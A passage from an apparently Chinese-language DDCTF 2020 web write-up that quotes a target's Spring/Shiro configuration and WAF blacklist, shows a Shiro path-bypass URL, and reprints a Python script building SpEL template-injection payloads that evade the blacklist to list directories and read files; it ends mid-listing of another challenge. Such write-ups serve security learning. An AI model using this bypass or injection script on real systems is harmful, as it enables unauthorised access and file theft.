class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>forceEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>safeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>safeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>shiroFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>targetFilterLifecycle<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>shiroFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>500<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/hacker.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>403<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/hacker.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>经典的Spring框架，知道这个对其实我们其实可以直接把大部分代码读出来了。<br>Spring是一个MVC框架，故读出来的文件中我们需要重点关注的是Controller控制层的代码<br>根据目前的情况，我们需要寻找能够帮助我们成为admin的信息</p><p>一番翻找后，在 &#x2F;WEB-INF&#x2F;classes&#x2F;spring-shiro.xml 中有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;shiroFilter&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;securityManager&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;securityManager&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/login&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;successUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/index&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;unauthorizedUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;filterChainDefinitionMapBuilder&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;buildFilterChainDefinitionMap&quot;</span>/&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;filterChainDefinitionMapBuilder&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.ctf.auth.FilterChainDefinitionMapBuilder&quot;</span>/&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;securityManager&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;realm&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;myRealm&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myRealm&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.ctf.auth.ShiroRealm&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其下的 &#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;auth&#x2F;FilterChainDefinitionMapBuilder.class 中可以看到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.auth;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterChainDefinitionMapBuilder</span><br>&#123;<br>    <span class="hljs-keyword">public</span> LinkedHashMap&lt;String, String&gt; <span class="hljs-title function_">buildFilterChainDefinitionMap</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">final</span> LinkedHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;String, String&gt;();<br>        map.put(<span class="hljs-string">&quot;/logout&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/download&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/68759c96217a32d5b368ad2965f625ef/**&quot;</span>, <span class="hljs-string">&quot;authc,roles[admin]&quot;</span>);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是使用CVE绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index<br></code></pre></td></tr></table></figure><p>进入admin界面<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200909143033583.png" alt="在这里插入图片描述"></p><p>后面就是绕WAF做SpE注入L，WAF在 WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;util&#x2F;SafeFilter.class 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.util;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklists = &#123;<span class="hljs-string">&quot;java.+lang&quot;</span>, <span class="hljs-string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="hljs-string">&quot;exec.*\\(&quot;</span>, <span class="hljs-string">&quot;write|read&quot;</span>, <span class="hljs-string">&quot;invoke.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.forName.*\\(&quot;</span>, <span class="hljs-string">&quot;lookup.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="hljs-string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;com.+fasterxml&quot;</span>, <span class="hljs-string">&quot;org.+apache&quot;</span>, <span class="hljs-string">&quot;org.+hibernate&quot;</span>, <span class="hljs-string">&quot;org.+thymeleaf&quot;</span>, <span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;javax\\.&quot;</span>, <span class="hljs-string">&quot;eval.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getClass\\(&quot;</span>, <span class="hljs-string">&quot;org.+springframework&quot;</span>, <span class="hljs-string">&quot;javax.+el&quot;</span>, <span class="hljs-string">&quot;java.+io&quot;</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UTF-8&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig arg0)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span><br>            <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">pNames</span> <span class="hljs-operator">=</span> request.getParameterNames();<br>        <span class="hljs-keyword">while</span> (pNames.hasMoreElements()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) pNames.nextElement();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> request.getParameter(name);<br>            <span class="hljs-keyword">for</span> (String blacklist : blacklists) &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> Pattern.compile(blacklist, <span class="hljs-number">34</span>).matcher(value);<br>                <span class="hljs-keyword">if</span> (matcher.find()) &#123;<br>                    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>                    servletResponse.sendError(<span class="hljs-number">403</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        filterChain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面没绕出来，贴一下原WP的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">requestToServer</span>(<span class="hljs-params">content</span>):<br>    content = <span class="hljs-string">&#x27;[[$&#123;&#123;&#123;&#125;&#125;&#125;]]&#x27;</span>.<span class="hljs-built_in">format</span>(content)<br>    url = <span class="hljs-string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&#x27;</span><br>    response = requests.post(url=url, data=&#123;<span class="hljs-string">&#x27;content&#x27;</span>: content&#125;).text<br>    <span class="hljs-keyword">try</span>:<br>        redirect = re.search(<span class="hljs-string">&#x27;fetch \./(.*) !&#x27;</span>, response).group(<span class="hljs-number">1</span>)<br>        url = <span class="hljs-string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#x27;</span><br>        url += redirect<br>        <span class="hljs-keyword">return</span> requests.get(url).text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e) + response<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">toForNameOrStr</span>(<span class="hljs-params">source, strFlag=<span class="hljs-literal">False</span></span>):<br>    res = <span class="hljs-string">&#x27;T(Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(source[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> source[<span class="hljs-number">1</span>:]:<br>        res += <span class="hljs-string">&#x27;.concat(T(Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch)<br>    <span class="hljs-keyword">if</span> strFlag:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0.class. forName(&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(res)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler</span>():<br>    content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    <span class="hljs-built_in">dir</span> = request.form.get(<span class="hljs-string">&#x27;dir&#x27;</span>)<br>    file = request.form.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">dir</span>:<br>        <span class="hljs-comment"># 单层：java.util.Arrays.toString(java.nio.file.Files.list(java.nio.file.Paths.get(&quot;/&quot;)).toArray());</span><br>        <span class="hljs-comment"># 递归：java.util.Arrays.toString(java.nio.file.Files.walk(java.nio.file.Paths.get(&quot;/&quot;)).toArray());</span><br>        listDirPayload = <span class="hljs-string">&#x27;T(java.util.Arrays).toString(&#123;&#125;.list(&#123;&#125;.get(&#123;&#125;)).toArray())&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Files&#x27;</span>), toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Paths&#x27;</span>), toForNameOrStr(<span class="hljs-built_in">dir</span>, <span class="hljs-literal">True</span>))<br>        <span class="hljs-built_in">print</span>(listDirPayload)<br>        <span class="hljs-keyword">return</span> requestToServer(listDirPayload)<br><br>    <span class="hljs-keyword">if</span> file:<br>        <span class="hljs-comment"># java.nio.file.Files.lines(java.nio.file.Paths.get(&quot;/flag&quot;)).findFirst().toString()</span><br>        catFilePaylod = <span class="hljs-string">&#x27;&#123;&#125;.lines(&#123;&#125;.get(&#123;&#125;)).findFirst().toString()&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Files&#x27;</span>), toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Paths&#x27;</span>), toForNameOrStr(file, <span class="hljs-literal">True</span>))<br>        <span class="hljs-built_in">print</span>(catFilePaylod)<br>        <span class="hljs-keyword">return</span> requestToServer(catFilePaylod)<br><br>    <span class="hljs-keyword">return</span> requestToServer(content)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>看了看还有另外的思路是使用UrlClassLoader的</p><p>见 <a href="https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20/">https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20&#x2F;</a></p><h1 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907201435244.png" alt="在这里插入图片描述"></p><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 